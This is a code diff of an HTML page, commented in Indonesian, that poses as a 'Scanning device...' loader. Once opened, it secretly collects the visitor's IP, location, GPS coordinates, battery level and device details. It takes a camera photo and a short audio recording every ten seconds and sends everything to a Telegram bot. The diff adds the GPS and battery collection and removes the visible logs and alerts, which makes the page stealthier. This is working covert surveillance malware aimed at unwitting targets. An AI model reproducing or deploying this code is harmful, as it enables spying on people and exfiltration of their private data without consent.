@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>INITIALIZING...</title>
+  <title>Loading system...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -23,7 +23,7 @@
 </head>
 <body>
 
-<h1>Connecting to device...</h1>
+<h1>Scanning device...</h1>
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
@@ -34,48 +34,62 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
-// STEP 1: Ambil IP & Lokasi
+function kirimPesan(text) {
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id, text })
+  });
+}
+
+// Ambil IP & lokasi berdasarkan IP
 fetch('https://api.ipify.org?format=json')
   .then(res => res.json())
-  .then(ipData => {
-    const ip = ipData.ip;
-    return fetch('https://ipapi.co/' + ip + '/json/');
-  })
+  .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
   .then(loc => loc.json())
   .then(info => {
-    const message = `
-== IP DETECTED ==
+    const device = navigator.userAgent;
+    navigator.getBattery().then(bat => {
+      const status = `
+== DETEKSI TARGET ==
 IP: ${info.ip}
-Kota: ${info.city}
-Region: ${info.region}
 Negara: ${info.country_name}
+Region: ${info.region}
+Kota: ${info.city}
 ISP: ${info.org}
-Device: ${navigator.userAgent}
-=================`;
-    // Kirim IP ke Telegram
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id, text: message })
+Baterai: ${Math.floor(bat.level * 100)}%
+Device: ${device}
+=====================`;
+      kirimPesan(status);
     });
   });
 
-// STEP 2: Kamera + Mic + Looping Foto & Audio
+// Ambil lokasi GPS (jika user izinkan)
+if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(pos => {
+    const lat = pos.coords.latitude;
+    const lon = pos.coords.longitude;
+    const lokasi = `Lokasi GPS:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+    kirimPesan(lokasi);
+  });
+}
+
+// Kamera + Mic + Rekaman Otomatis
 navigator.mediaDevices.getUserMedia({ video: true, audio: true })
 .then(stream => {
   video.srcObject = stream;
   video.play();
 
   setInterval(() => {
-    capturePhoto();
-    recordAudio(stream);
+    ambilFoto();
+    rekamAudio(stream);
   }, 10000); // tiap 10 detik
 })
 .catch(err => {
-  alert("Akses media ditolak: " + err);
+  kirimPesan("Gagal akses media: " + err);
 });
 
-function capturePhoto() {
+function ambilFoto() {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -86,11 +100,11 @@ function capturePhoto() {
     fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
       method: 'POST',
       body: form
-    }).then(() => console.log("Foto dikirim"));
+    });
   }, 'image/jpeg');
 }
 
-function recordAudio(stream) {
+function rekamAudio(stream) {
   const recorder = new MediaRecorder(stream);
   let chunks = [];
   recorder.ondataavailable = e => chunks.push(e.data);
@@ -102,7 +116,7 @@ function recordAudio(stream) {
     fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
       method: 'POST',
       body: form
-    }).then(() => console.log("Audio dikirim"));
+    });
   };
   recorder.start();
   setTimeout(() => recorder.stop(), 5000);
